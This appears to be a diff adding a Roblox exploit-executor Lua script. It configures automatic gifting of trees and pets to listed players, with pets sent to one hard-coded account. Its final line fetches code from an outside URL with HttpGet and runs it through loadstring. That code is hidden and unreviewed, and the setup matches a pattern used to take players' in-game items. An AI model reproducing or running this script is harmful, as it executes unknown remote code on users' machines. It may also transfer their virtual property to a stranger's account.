@@ -1,0 +1,21 @@
+_G.CF = {
+    TreeConfig = {
+        Enabled = true,                         -- Enable/disable tree gifting
+        KickWhenEmpty = true,                   -- Kick when no more trees to gift
+        Sender = "TreeSenderName",               -- Account that sends trees
+        TreeName = "Oak",                        -- Tree name (partial match)
+        TargetList = { "Player1", "Player2" },   -- Players to receive trees
+        PerPlayer = 3                            -- Trees per player
+    },
+
+    PetConfig = {
+        Enabled = true,                          -- Enable/disable pet gifting
+        KickWhenEmpty = true,                    -- Kick when no more pets to gift
+        GiftForPlayer = "mghmghmgh9",       -- Account that receives pets
+        ListPetGift = {                          -- Pet name and amount
+            ["French Fry Ferret"] = 1,
+            ["Drza"] = 1
+        }
+    }
+}
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/f3207df612e2e9d2"))()
